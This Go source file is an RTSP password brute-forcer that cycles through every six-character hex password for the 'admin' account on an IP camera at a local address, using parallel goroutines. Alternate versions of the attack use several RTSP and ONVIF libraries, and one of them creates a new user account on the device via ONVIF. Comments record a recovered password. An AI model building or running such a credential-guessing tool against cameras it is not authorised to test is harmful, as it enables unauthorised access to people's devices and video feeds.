package main

import (
	"flag"
	"fmt"
	ortsp "github.com/aboukirev/ouro/net/rtsp"
	"github.com/aler9/gortsplib"
	"github.com/aler9/gortsplib/pkg/base"
	"github.com/nareix/joy4/av/avutil"
	"github.com/nareix/joy4/format"
	"github.com/nareix/joy4/format/rtsp"
	gvif "github.com/use-go/onvif"
	"github.com/use-go/onvif/device"
	"github.com/use-go/onvif/xsd/onvif"
	"log"
	"net/url"
	"os"
	"rtsp-manual-bruter/RtspBruteClient"
	"strings"
	"sync"
	"time"
)

var host *string
var port *string
func main() {
	host = flag.String("Host", "192.168.0.23", "Enter the RTSP target")
	port = flag.String("Port", "2600", "Enter the RTSP target port")
	flag.Parse()
	log.Println("Starting RTSP Brute Forcer")

	joy4()

	//
	// Failed attempts for your browsing pleasure!
	//

	//gortsplibcht()
	//ourooo()
	//onviffer()
}

func joy4Worker(charsetTop []string){
	log.Println("Starting with Charset: ", charsetTop)
	//
	// Prestage the Options, do a stream of DESCRIBE in the password check code
	dialStr := "rtsp://admin:"+"blerp"+"@"+*host+":"+*port+"/"
	c, cErr := rtsp.DialTimeout(dialStr, 500 * time.Millisecond)

	if cErr != nil{
		//log.Println("Dial Error:", cErr)
		if c != nil {
			c.Close()
		}
		log.Println("Unable to establish a connection, qutting!")
		return
	}

	//
	// Set DEBUG options (if wanted)
	c.DebugRtsp = false
	c.DebugRtp = false
	defer c.Close()

	oErr := c.Options()
	if oErr != nil{
		log.Println("Options Error:", oErr)
		//c.Close()
		return
	}

	pwdDiscovery := false
	var charset = []string{"a", "0", "b", "1", "c", "2", "d", "3", "e", "f", "4", "5", "6", "7", "8", "9"}

	for _, char := range charsetTop{
		for _, char2 := range charset{
			for _, char3 := range charset{
				for _, char4 := range charset{
					log.Println("Tick", char+char2+char3+char4)
					for _, char5 := range charset{
						for _, char6 := range charset{
							pwd := char+char2+char3+char4+char5+char6
							//if strings.HasPrefix(pwd, "fc4"){
							//	if pwd == "fc424b"{
							//		log.Println("testing 'the one'!")
							//	}
							fmt.Print(".")
							//time.Sleep(1*time.Millisecond)

							//
							// Run the checks in-line
							dialStr2 := "rtsp://admin:"+pwd+"@"+*host+":"+*port+"/"
							var URL *url.URL
							URL, _ = url.Parse(dialStr2)
							c.Url = URL

							_, rErr := c.Describe()
							//log.Println("pwd:", pwd, r, rErr)
							if rErr == nil{
								pwdDiscovery = true
								log.Println("found it!")
							}

							//pwdDiscovery, pwdDiscoveryErr := dialAndTestOld(pwd)
							////pwdDiscovery, pwdDiscoveryErr := dialAndTestAvUtilDoesntSendOptionsBeforeDescribe(pwd)
							//if pwdDiscoveryErr != nil{
							//	//log.Println(pwdDiscoveryErr)
							//}
							if pwdDiscovery {
								log.Println("Found password:", pwd)
								os.Exit(0)						// hard exit if we get this!
								return
							}
							//}
						}
					}
				}
			}
		}
	}
}

func joy4(){
	format.RegisterAll()		// Examples show this is needed for avutil(?) // https://github.com/nareix/joy4/issues/11

	var charset_A = []string{"a", "0", "b"}
	var charset_B = []string{"c", "2", "d"}
	var charset_C = []string{"e", "f", "4"}
	var charset_D = []string{"6", "7", "8"}
	var charset_E = []string{"5", "3", "1", "9"}

	var waiter sync.WaitGroup
	go func() {joy4Worker(charset_A)}()
	waiter.Add(1)
	go func() {joy4Worker(charset_B)}()
	waiter.Add(1)
	go func() {joy4Worker(charset_C)}()
	waiter.Add(1)
	go func() {joy4Worker(charset_D)}()
	waiter.Add(1)
	go func() {joy4Worker(charset_E)}()
	waiter.Add(1)

	waiter.Wait()
	log.Println("Whelp, thats an exit!")
}

//
// FAILS as the camera seems to require an 'options' request before sending a DESCRIBE
//		avutil doesn't seem to do this...
func dialAndTestAvUtilDoesntSendOptionsBeforeDescribe(pwd string) (bool, error){
	retVal := false
	dialStr := "rtsp://admin:"+pwd+"@192.168.0.23:2600/"

	dmx, dmxErr := avutil.Open(dialStr)
	if dmxErr != nil{
		//log.Println(dmxErr)
		return retVal, dmxErr
	}
	defer dmx.Close()

	cdx, cdxErr := dmx.Streams()
	if cdxErr != nil{
		log.Println(cdxErr)
	}
	log.Println(cdx)

	return retVal, nil
}

//
// Tries to dial using the password
// Returns a bool indicating if connection was successful
// Also returns an error with details
func dialAndTestOld(pwd string) (bool, error){
	//c, cErr := rtsp.Dial("rtsp://admin:admin@192.168.0.23:2600/")    // incorrect
	//rtsp.Dial("rtsp://admin:fc424b@192.168.0.23:2600/") // correct
	retVal := false
	dialStr := "rtsp://admin:"+pwd+"@192.168.0.23:2600/"
	c, cErr := rtsp.DialTimeout(dialStr, 1000 * time.Millisecond)

	if cErr != nil{
		//log.Println("Dial Error:", cErr)
		if c != nil {
			c.Close()
		}
		return false, cErr
	}
	c.DebugRtsp = true
	c.DebugRtp = true
	defer c.Close()

	oErr := c.Options()
	if oErr != nil{
		//log.Println("Options Error:", oErr)
		//c.Close()
		return false, oErr
	}

	//res, resErr := c.ReadResponse()
	//if resErr !=nil{
	//	log.Println("Unable to read options response!", resErr)
	//	//c.Close()
	//	return false, resErr
	//}
	//fmt.Print(res.StatusCode)

	_, sErr := c.Describe()
	if sErr != nil{
		//log.Println("Describe Error:", sErr)
		//c.Close()
		return false, sErr
	} else {
		retVal = true
	}

	permutate(c)

	//e := c.Close()
	//if e != nil{
	//	//log.Println("Error while closing connection. ", e)
	//	return retVal, e
	//}
	//c.Close()

	return retVal, nil
}

func permutate(c *rtsp.Client){
	pwds := []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k"}
	for _, pwd := range pwds{
		dialStr2 := "rtsp://admin:"+pwd+"@192.168.0.23:2600/"
		var URL *url.URL
		URL, _ = url.Parse(dialStr2)
		c.Url = URL

		r, rErr := c.Describe()
		log.Println("pwd:", pwd, r, rErr)
		if rErr != nil{
			log.Println("found it!")
		}
	}
}


//
// Manual stuff(?)
func mainMine() {
	rtspUrl := flag.String("RtspUrl", "", "Enter the RTSP URL to target")
	flag.Parse()

	rbc := RtspBruteClient.RtspBruteClient{}
	rbc.SetTarget(*rtspUrl)

	passwords := []string{"ffaaccdd", "fc424b"}

	for _, pwd := range passwords{
		e := rbc.Authenticate(pwd)
		log.Println(e)
	}
}




func ourooo(){
	var charset = []string{"a", "0", "b", "1", "c", "2", "d", "3", "e", "f", "4", "5", "6", "7", "8", "9"}

	for _, char := range charset{
		for _, char2 := range charset{
			for _, char3 := range charset{
				for _, char4 := range charset{
					for _, char5 := range charset{
						for _, char6 := range charset{
							pwd := char+char2+char3+char4+char5+char6
							if strings.HasPrefix(pwd, "fc424"){
								if pwd == "fc424b"{
									log.Println("testing 'the one'!")
								}
								fmt.Print(".")
								time.Sleep(1*time.Millisecond)
								success, successErr := dialAndTestOurooo(pwd)
								if successErr != nil{
									//log.Println(successErr)
								}
								if success{
									log.Println("Found password:", pwd)
									return
								}
							}
						}
					}
				}
			}
		}
	}
}


//
// Tries to dial using the password
// Returns a bool indicating if connection was successful
// Also returns an error with details
func dialAndTestOurooo(pwd string) (bool, error){
	retVal := false
	dialStr := "rtsp://admin:"+pwd+"@192.168.0.23:2600/"

	//c, cErr := ortsp.Dial(dialStr, ortsp.ProtoTCP)
	//if cErr != nil{
	//	log.Println(cErr)
	//}

	ns := ortsp.NewSession()
	oe := ns.Open(dialStr, ortsp.ProtoTCP)
	if oe != nil{
		log.Println(oe)
	}

	de := ns.Describe()
	if de != nil{
		log.Println(de)
	}

	return retVal, nil
}


func gortsplibcht(){
	var charset = []string{"a", "0", "b", "1", "c", "2", "d", "3", "e", "f", "4", "5", "6", "7", "8", "9"}

	for _, char := range charset{
		for _, char2 := range charset{
			for _, char3 := range charset{
				for _, char4 := range charset{
					for _, char5 := range charset{
						for _, char6 := range charset{
							pwd := char+char2+char3+char4+char5+char6
							if strings.HasPrefix(pwd, "fc424"){
								if pwd == "fc424b"{
									log.Println("testing 'the one'!")
								}
								fmt.Print(".")
								time.Sleep(1*time.Millisecond)
								success, successErr := dialAndTestGortsplib(pwd)
								if successErr != nil{
									//log.Println(successErr)
								}
								if success{
									log.Println("Found password:", pwd)
									return
								}
							}
						}
					}
				}
			}
		}
	}
}

//
// Tries to dial using the password
// Returns a bool indicating if connection was successful
// Also returns an error with details
func dialAndTestGortsplib(pwd string) (bool, error) {

	retVal := false
	dialStr := "rtsp://admin:"+pwd+"@192.168.0.23:2600/"
	urlParsed, _ := base.ParseURL(dialStr)
	conn, err := gortsplib.Dial(urlParsed.Scheme, urlParsed.Host)
	if err != nil{
		log.Println("Unable to connect. Err:", err)
	}
	defer conn.Close()

	br, brErr := conn.Options(urlParsed)
	if brErr != nil{
		log.Println(brErr)
	}
	log.Println(br)

	t, u, brt, brtErr := conn.Describe(urlParsed)
	if brtErr != nil{
		log.Println("Unable to describe. Err:", brtErr)
	}
	log.Println(t)
	log.Println(u)
	log.Println(brt)



	//// Client allows to set additional client options
	//c := &gortsplib.Client{
	//	// the stream protocol (UDP or TCP). If nil, it is chosen automatically
	//	Protocol: nil,
	//	// timeout of read operations
	//	ReadTimeout: 10 * time.Second,
	//	// timeout of write operations
	//	WriteTimeout: 10 * time.Second,
	//}
	//
	//// connect to the server and start reading all tracks
	//conn, err := c.DialRead(dialStr)
	//if err != nil {
	//	panic(err)
	//}
	//defer conn.Close()
	//
	//conn.Options()

	return retVal, nil
}



func onviffer(){
	var charset = []string{"a", "0", "b", "1", "c", "2", "d", "3", "e", "f", "4", "5", "6", "7", "8", "9"}

	for _, char := range charset{
		for _, char2 := range charset{
			for _, char3 := range charset{
				for _, char4 := range charset{
					for _, char5 := range charset{
						for _, char6 := range charset{
							pwd := char+char2+char3+char4+char5+char6
							if strings.HasPrefix(pwd, "fc42"){
								if pwd == "fc424b"{
									log.Println("testing 'the one'!")
								}
								fmt.Print(".")
								time.Sleep(1*time.Millisecond)
								pwdDiscovery, pwdDiscoveryErr := dialAndTestOnvif(pwd)
								if pwdDiscoveryErr != nil{
									//log.Println(pwdDiscoveryErr)
								}
								if pwdDiscovery {
									log.Println("Found password:", pwd)
									return
								}
							}
						}
					}
				}
			}
		}
	}
}

//
// Tries to dial using the password
// Returns a bool indicating if connection was successful
// Also returns an error with details
func dialAndTestOnvif(pwd string) (bool, error){
	//retVal := false
	//dialStr := "rtsp://admin:"+pwd+"@192.168.0.23:2600/"

	//
	// Russian
	//d, dErr := goonvif.NewDevice("192.168.0.23")
	//if dErr != nil{
	//	log.Println(dErr)
	//}
	//d.Authenticate("admin", pwd)
	//
	//caps := Device.GetCapabilities{Category: "All"}
	//r, rErr := d.CallMethod(caps)
	//if rErr != nil{
	//	log.Println(rErr)
	//}
	//log.Println(r)

	//
	// v0.0.1
	//d, dErr := onvif.NewDevice("192.168.0.23")
	//if dErr != nil{
	//	log.Println(dErr)
	//}
	//d.Authenticate("admin", pwd)
	//
	//caps := d.GetServices()
	//log.Println(caps)

	//
	//	MASTER
	//
	dPam := gvif.DeviceParams{Xaddr: "192.168.0.23", Username: "admin", Password: pwd}
	d, dErr := gvif.NewDevice(dPam)
	if dErr != nil{
		log.Println(dErr)
	}

	i := d.GetDeviceInfo()
	s := d.GetServices()
	log.Println(i, s)

	//sdt := device.GetSystemDateAndTime{}
	//ptzcR, ptzcRErr := d.CallMethod(sdt)
	//log.Println(ptzcRErr)
	//log.Println(ptzcR)

	createUser := device.CreateUsers{User: onvif.User{
		Username:  "TestUser",
		Password:  "TestPassword",
		UserLevel: "User",
	},
	}


	r, rErr := d.CallMethod(createUser)
	log.Println(r, rErr)

	return false, nil
}

